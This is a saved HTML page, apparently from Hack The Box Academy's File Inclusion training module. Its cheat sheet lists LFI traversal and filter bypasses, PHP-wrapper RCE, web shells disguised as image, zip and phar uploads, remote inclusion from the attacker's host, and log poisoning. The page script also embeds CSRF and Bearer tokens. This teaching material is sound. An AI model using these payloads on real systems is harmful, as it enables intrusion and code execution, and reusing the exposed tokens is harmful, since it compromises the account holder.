+</div>
+</div>
+</div>
+</div>
+<div id="hint91" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="hint91" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center">
+<h5><i class="fad fa-life-ring text-success"></i>&nbsp; Hint</h5>
+<br>
+<h6></h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="cheatSheetModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="unlockModuleModal" aria-hidden="true">
+<div class="modal-dialog modal-lg">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center text-break">
+<h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
+<p>The cheat sheet is as a useful command reference for this module.</p>
+<h2>Local File Inclusion</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&nbsp;<strong>Basic LFI</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=/etc/passwd</code></td>
+<td>Basic LFI</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=../../../../etc/passwd</code></td>
+<td>LFI with path traversal</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=/../../../etc/passwd</code></td>
+<td>LFI with name prefix</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=./languages/../../../../etc/passwd</code></td>
+<td>LFI with approved path</td>
+</tr>
+<tr>
+<td>&nbsp;<strong>LFI Bypasses</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=....//....//....//....//etc/passwd</code></td>
+<td>Bypass basic path traversal filter</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td>
+<td>Bypass filters with URL encoding</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td>
+<td>Bypass appended extension with path truncation (obsolete)</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=../../../../etc/passwd%00</code></td>
+<td>Bypass appended extension with null byte (obsolete)</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td>
+<td>Read PHP with base64 filter</td>
+</tr>
+</tbody>
+</table></div>
+<h2>Remote Code Execution</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&nbsp;<strong>PHP Wrappers</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td>
+<td>RCE with data wrapper</td>
+</tr>
+<tr>
+<td>&nbsp;<code>curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id"</code></td>
+<td>RCE with input wrapper</td>
+</tr>
+<tr>
+<td>&nbsp;<code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"</code></td>
+<td>RCE with expect wrapper</td>
+</tr>
+<tr>
+<td>&nbsp;<strong>RFI</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>&nbsp;<code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td>
+<td>Host web shell</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td>
+<td>Include remote PHP web shell</td>
+</tr>
+<tr>
+<td>&nbsp;<strong>LFI + Upload</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>&nbsp;<code>echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif</code></td>
+<td>Create malicious image</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded image</td>
+</tr>
+<tr>
+<td>&nbsp;<code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></td>
+<td>Create malicious zip archive 'as jpg'</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded zip</td>
+</tr>
+<tr>
+<td>&nbsp;<code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></td>
+<td>Create malicious phar 'as jpg'</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded phar</td>
+</tr>
+<tr>
+<td>&nbsp;<strong>Log Poisoning</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td>
+<td>Read PHP session parameters</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td>
+<td>Poison PHP session with web shell</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+<tr>
+<td>&nbsp;<code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></td>
+<td>Poison server log</td>
+</tr>
+<tr>
+<td>&nbsp;<code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+</tbody>
+</table></div>
+<h2>Misc</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&nbsp;<code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
+<td>Fuzz page parameters</td>
+</tr>
+<tr>
+<td>&nbsp;<code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code></td>
+<td>Fuzz LFI payloads</td>
+</tr>
+<tr>
+<td>&nbsp;<code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td>
+<td>Fuzz webroot path</td>
+</tr>
+<tr>
+<td>&nbsp;<code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code></td>
+<td>Fuzz server configurations</td>
+</tr>
+<tr>
+<td>&nbsp;<a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlists</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Webroot path wordlist for Linux</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Webroot path wordlist for Windows</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">Server configurations wordlist for Linux</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">Server configurations wordlist for Windows</a></td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
+<h2>File Inclusion Functions</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th align="center"><strong>Read Content</strong></th>
+<th align="center"><strong>Execute</strong></th>
+<th align="center"><strong>Remote URL</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>include()</code>/<code>include_once()</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><code>require()</code>/<code>require_once()</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><code>fopen()</code>/<code>file()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>fs.readFile()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>fs.sendFile()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>@Html.Partial()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><code>Response.WriteFile()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+</tbody>
+</table></div>
+</div>
+</div>
+<div class="modal-footer">
+<a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/23">Download Cheatsheet</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<footer class="footer">
+<div class="container-fluid">
+<div class="row">
+<div class="col-sm-6">
+</div>
+<div class="col-sm-6">
+<div class="text-sm-right d-none d-sm-block">
+Powered by &nbsp; <a href="https://www.hackthebox.com/" target="_blank"><img style="margin-bottom: 1px;" src="./File Inclusion5_files/logo-htb.svg" height="20px"></a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</div>
+</div>
+</div>
+<script src="./File Inclusion5_files/jquery.min.js.download"></script>
+<script src="./File Inclusion5_files/bootstrap.bundle.min.js.download"></script>
+<script src="./File Inclusion5_files/metisMenu.min.js.download"></script>
+<script src="./File Inclusion5_files/simplebar.min.js.download"></script>
+<script src="./File Inclusion5_files/waves.min.js.download"></script>
+<script src="./File Inclusion5_files/toastr.min.js.download"></script>
+<script src="./File Inclusion5_files/axios.min.js.download"></script>
+<script src="./File Inclusion5_files/prism.js.download"></script>
+<script src="./File Inclusion5_files/main.js.download"></script>
+<script>
+    axios.defaults.headers.common = {
+        'X-CSRF-TOKEN': 'OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Authorization': 'Bearer ' + 'jgfghW9jOUxTYrPOMG9i2ujbtUFdtKuilcFrKtLWJpv9gAzKxNnjcsm7Dg2wIx8ivYvDBp7jCWD5XRNP'
+    };
+</script>
+<script>
+    $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');
+
+    $('.training-module a').attr('target','_blank').attr('rel','noopener nofollow');
+
+    $( ".favouriteBtn" ).click(function() {
+        let id = $(this).data('module-id');
+
+        axios.get('/api/modules/favourite/'+id).then(response => {
+            let data = response.data;
+            if (data.fav === 1) {
+                $(this).removeClass('far fa').addClass('fa');
+                toastr["success"](data.message, "Success");
+            } else {
+                $(this).removeClass('far fa').addClass('far');
+                toastr["success"](data.message, "Success");
+            }
+        });
+    });
+
+    function encode_utf8(string) {
+    return unescape(encodeURIComponent(string));
+  }
+
+  $('.btnAnswer').click(function() {
+    let question_id = $(this).data('question-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
+    axios.post('/api/check/answer', {
+      answer: btoa(utf8EncodedString),
+      question_id: question_id
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $('#answer' + question_id).attr('disabled', 1);
+        $('#answer' + question_id).addClass('text-success');
+        $('#hintBtn' + question_id).attr('disabled', 1);
+        toastr['success'](data.message, 'Success');
+        completeCheck();
+      }
+    });
+  });
+
+  $('.btnAnswerExercise').click(function() {
+    let exercise_id = $(this).data('exercise-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
+    axios.post(`/api/check/exercise/${exercise_id}/answer`, {
+      answer: btoa(utf8EncodedString)
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
+        toastr['success'](data.message, 'Success');
+      }
+    });
+  });
+
+    
+    $('.reveal-modal').click(e => {
+        let id = $(e.target).data('exercise-id');
+        $(`#revealExerciseAnswer${id}`).modal('hide');
+    });
+
+    $( document ).ready(function() {
+
+        $('pre').filter(function () {
+            return this.className.match(/\blanguage-/);
+        }).each(function () {
+            let heading = $(this).prevAll().closest('h4').last().text();
+
+            if (this.className === ' language-shell-session') {
+                wrapTerminal(this, heading);
+            } else if (this.className === ' language-powershell-session') {
+                wrapPSTerminal(this, heading);
+            } else if (this.className === ' language-cmd-session') {
+                wrapCMDTerminal(this, heading);
+            } else if (this.className.startsWith(' language-')) {
+                var language = this.className.split('-').pop();
+                wrapCodeBlock(this,language);
+            }
+        });
+
+        wrapBrowser($('.website-screenshot'));
+        completeCheck();
+
+        $("span:contains('[!bash!]')").html('<span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span>');
+    });
+
+    function completeCheck()
+    {
+        axios.get('/api/check/complete/253').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                if (data.completed === true) {
+                    $('#completeBtn').show();
+                }
+            }
+        });
+    }
+
+    function wrapTerminal(element, heading)
+    {
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapPSTerminal(element, heading)
+    {
+        $(element).css('background', '#012456').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCMDTerminal(element, heading)
+    {
+        $(element).css('background', 'black').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCodeBlock(element,lang)
+    {
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend('<div class="window_top">Code: <span class="text-success">'+lang+'</div>');
+    }
+    function wrapBrowserOld(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+        let url = element.data('url');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <input type="text" class="website-screenshot-url" disabled value="${url}">
+                    <span class="float-right"><i class="fa fa-home"></i></span>
+                </div>
+            `);
+    }
+    function wrapBrowser(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+
+        $(element).each( function(index,e) {
+            let url = $(e).data('url');
+            $(e).wrap('<div class="window_content"></div>')
+                .parent().wrap('<div class="window_container"></div>')
+                .prepend(`
+                    <div class="window_top">
+                        <span class="mr-2">
+                            <i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
+                        </span>
+                        <input type="text" class="website-screenshot-url" disabled value="${url}">
+                        <span class="float-right"><i class="fa fa-bars"></i></span>
+                    </div>
+                `);
+        })
+    }
+</script>
+<script type="module">
+    import RFB from '/assets/libs/vnc/core/rfb.js';
+
+    let rfb;
+    let sidePreview;
+    let desktopName;
+    let pwnboxActive = false;
+
+    function connectedToServer(e) {
+        status("Connected to " + desktopName);
+        $('.fullScreenBtn').show();
+        $('.resetInstanceBtn').show();
+        $('.terminateInstanceBtn').show();
+        $('.extendInstanceBtn').show();
+        $('.instanceLoading').hide();
+        $('.instanceStart').hide();
+        $('.resetInstanceBtn').prop('disabled',false);
+        $('.fullScreenBtn').prop('disabled',false);
+        $('.extendInstanceBtn').prop('disabled',false);
+        $('.terminateInstanceBtn').prop('disabled',false);
+
+        document.querySelector('canvas').addEventListener('focus', (event) => {
+            navigator.clipboard.readText()
+                .then(text => {
+                    writeToClipboard(text);
+                })
+                .catch(err => {
+                    console.log('Something went wrong while accessing clipboard', err);
+                })
+        });
+
+    }
+
+    function disconnectedFromServer(e) {
+        status("Disconnected");
+        $('.screenPlaceholder').show();
+        stopCountdown();
+    }
+
+    function clipboardReceived(e) {
+        navigator.clipboard.writeText(e.detail.text)
+            .then(() => {
+                // Success!
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    }
+
+    function updateDesktopName(e) {
+        desktopName = e.detail.name;
+    }
+
+    function status(text) {
+        console.log(text);
+        $("#statusText").html(text);
+    }
+
+    function readQueryVariable(name) {
+        const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
+            match = document.location.href.match(re);
+
+        if (match) {
+            return decodeURIComponent(match[1]);
+        }
+
+        return null;
+    }
+
+    function writeToClipboard(text) {
+        rfb.clipboardPasteFrom(text);
+    }
+
+    let host = '';
+    let password = '';
+    let countdown = '';
+    let targetCountdown = '';
+    let url= '';
+    let spawnInterval = null;
+
+    function getPwnbox() {
+        axios.get('/api/get/pwnbox').then(response => {
+            let data = response.data;
+
+            if (spawnInterval !== null && data.instance.action_log !== null) {
+                let error = data.instance.action_log.find(log => log.error === true);
+                if (error) {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+
+                    clearInterval(spawnInterval);
+                    disconnectedFromServer();
+
+                    let errorMessage = `${error.text}. Please contact support.`;
+                    toastr["error"](errorMessage, "Error");
+
+                    status(errorMessage);
+                    return;
+                }
+            }
+
+            if (data.success === 1 && data.instance.vnc_password !== null) {
+                if (data.instance.action_log.find(log => log.action === 'ready')) {
+                    host = 'proxy-uk.htb-cloud.com/bird/' + data.instance.hostname;
+                    password = data.instance.vnc_password;
+                    $('.lifeLeft').html(data.instance.life_remaining);
+                    startCountdown();
+                    $('.screenPlaceholder').hide();
+                    url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
+                    pwnboxActive = true;
+                    connect();
+
+                    if (spawnInterval !== null) {
+                        clearInterval(spawnInterval);
+                    }
+                }
+            } else {
+                $('.screenPlaceholder').show();
+            }
+
+        });
+    }
+
+        function extendPwnbox() {
+        axios.get('/api/extend/pwnbox').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                $('.lifeLeft').html(data.instance.life_remaining);
+                stopCountdown();
+                startCountdown();
+                toastr["success"]("Time extended for 60 minutes.", "Success");
+            } else {
+                toastr["error"](data.message, "Error");
+            }
+
+        });
+    }
+    
+    getPwnbox();
+
+    function startCountdown() {
+        countdown = setInterval(function() {
+            let life = parseInt($('.lifeLeft').html()) -1;
+            $('.lifeLeft').html(life)
+        }, 60 * 1000);
+    }
+
+    function stopCountdown() {
+        clearInterval(countdown);
+    }
+
+    function terminatePwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+
+        $('.instanceTerminating').show();
+
+        status('Terminating Interactive Instance...');
+
+        axios.delete('/api/terminate/pwnbox')
+            .then(({ data }) => {
+                if (data.success === 1) {
+                    $('.startInstanceBtn').show();
+                    $('.instanceStart').show();
+                    $('.instanceTerminating').hide();
+                    $('.resetInstanceBtn').hide();
+                    $('.terminateInstanceBtn').hide();
+                    $('.fullScreenBtn').hide();
+                    $('.extendInstanceBtn').hide();
+
+                    pwnboxActive = false;
+
+                    toastr['success']('Instance has been terminated.', 'Success');
+                } else {
+                    toastr['error'](data.message, 'Error');
+                    connect();
+                    $('.resetInstanceBtn').prop("disabled", false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                }
+            });
+    }
+
+    function startPwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+        $('.instanceLoading').show();
+        $('.startInstanceBtn').hide();
+
+        status("Starting Interactive Instance...");
+
+        grecaptcha.ready(function() {
+            grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', {action: 'spawnPwnbox'}).then(function(token) {
+                if (token) {
+                    axios.get('/api/spawn/pwnbox?g-recaptcha-response= '+token).then(response => {
+                        let data = response.data;
+                        if (data.success === 1) {
+                            spawnInterval = setInterval(() => {
+                                getPwnbox();
+                            }, 2000);
+                        } else {
+                            if(data.code === 1 || (data.code === 3 && pwnboxActive)) {
+                                $('.resetInstanceBtn').prop("disabled", false);
+                                $('.fullScreenBtn').prop('disabled',false);
+                                $('.extendInstanceBtn').prop('disabled',false);
+                                $('.terminateInstanceBtn').prop('disabled',false);
+                                connect();
+
+                                if (data.code === 3) {
+                                    $('.instanceLoading').hide();
+                                    startCountdown();
+                                }
+                            } else {
+                                $('.startInstanceBtn').show();
+                                $('.instanceStart').show();
+                                $('.instanceLoading').hide();
+                            }
+
+                            toastr["error"](data.message, "Error");
+                        }
+
+                    });
+                } else {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+                }
+            });
+        });
+    }
+
+    $('.fullScreenBtn').click(function() {
+        window.open(url, "_blank");
+    });
+
+    $('.startInstanceBtn').click(function() {
+        startPwnbox();
+                spawnTarget();
+            });
+
+    $('.resetInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                rfb.disconnect();
+                sidePreview.disconnect();
+        startPwnbox();
+    });
+
+    $('.terminateInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                rfb.disconnect();
+                sidePreview.disconnect();
+        terminatePwnbox();
+    });
+
+    $('.extendInstanceBtnClicker').click(function() {
+       extendPwnbox();
+    });
+
+    $('.resetTargetBtn').click(function(){
+        $(this).prop('disabled',true);
+                    spawnDocker();
+                    });
+
+    function connect() {
+        status("Connecting to " + host.split('/')[2] + "...");
+
+                rfb = new RFB(document.getElementById('screen'), 'wss://' + host,
+            { credentials: { password: password } });
+        //Listeners
+        rfb.addEventListener("desktopname", updateDesktopName);
+        rfb.addEventListener("clipboard",clipboardReceived);
+
+        rfb.resizeSession = true;
+        rfb.viewOnly = false;
+        
+        sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
+            { credentials: { password: password } });
+
+        sidePreview.addEventListener("connect",  connectedToServer);
+        sidePreview.addEventListener("disconnect", disconnectedFromServer);
+
+        sidePreview.resizeSession = false;
+        sidePreview.viewOnly = true;
+        sidePreview.scaleViewport = true;
+    }
+
+    $('.target, .targetIp').click(e => {
+        if ($('.resetTargetBtn').is(':hidden')) return;
+        navigator.clipboard.writeText($(e.target).html())
+            .then(() => {
+                toastr['success']('Target copied to clipboard', 'Success');
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    });
+
+        $('.spawnTargetBtn').click(function() {
+        spawnDocker();
+    })
+
+    function spawnDocker() {
+        $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
+        axios.get('/api/spawn/container/253').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                $('.target').html(data.instance.hostname+":"+data.instance.port);
+                $('.targetIp').html(data.instance.hostname);
+                $('.resetTargetBtn').show();
+                $('.resetTargetBtn').prop('disabled',false);
+                $('.targetLifeTimeContainer').show();
+                $('.targetLifeTime').html(90);
+                startTargetCountdown();
+            } else {
+                toastr["error"]("Target failed to spawn. Please try refreshing the page.", "Error");
+                $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target failed to spawn :(');
+                $('.resetTargetBtn').prop('disabled',false);
+            }
+        });
+    }
+        
+    function startTargetCountdown() {
+        targetCountdown = setInterval(function() {
+            let life = parseInt($('.targetLifeTime').html()) -1;
+            $('.targetLifeTime').html(life)
+            if (life == 0) {
+                $('.targetLifeTimeContainer').hide();
+            }
+        }, 60 * 1000);
+    }
+</script>
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./File Inclusion5_files/anchor.html" width="256" height="60" role="presentation" name="a-xd1gd3giqqcc" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./File Inclusion5_files/saved_resource.html"></iframe></div><div id="torrent-scanner-popup" style="display: none;"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./File Inclusion5_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 